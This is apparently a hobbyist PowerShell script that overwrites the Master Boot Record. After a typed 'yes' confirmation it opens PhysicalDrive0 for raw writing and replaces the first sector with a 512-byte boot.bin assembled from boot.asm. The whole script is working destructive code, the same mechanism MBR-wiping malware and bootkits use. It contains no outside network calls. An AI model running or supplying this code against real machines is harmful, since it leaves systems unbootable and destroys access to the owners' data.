
# Confirmation
$confirmation = Read-Host -Prompt "This program is dangerous! Are you sure that you want to run this? Please type 'yes' or type 'no'"
if ($confirmation -ne "yes") { Write-Host "Exiting program..." ; exit -1 }

# Overwrite
$drive = [System.IO.FileStream]::new("\\\\.\\PhysicalDrive0", [System.IO.FileMode]::Open, [System.IO.FileAccess]::ReadWrite, [System.IO.FileShare]::Read, 0)
if (!$drive) { Write-Host "Error opening a handle to the drive." ; exit -1 }

$binary = [System.IO.File]::OpenRead(".\boot.bin")
if (!$binary) { Write-Host "Error opening a handle to boot.bin" ; exit -1 }

$size = $binary.Length
if ($size -ne 512) { Write-Host "Error opening a handle to boot.bin" ; exit -1 }

$new_mbr = [byte[]]::new($size)
$bytes_read = $binary.Read($new_mbr, 0, $size)

if ($bytes_read -eq $size) {
    $drive.Write($new_mbr, 0, $size)
    Write-Host "First sector overwritten successfully!"
} else {
    Write-Host "Error reading boot.bin"
    Write-Host "Make sure to compile the ASM file with 'nasm -f bin -o boot.bin boot.asm'"
}

$binary.Close()
$drive.Close()
Read-Host "Press Enter to exit"
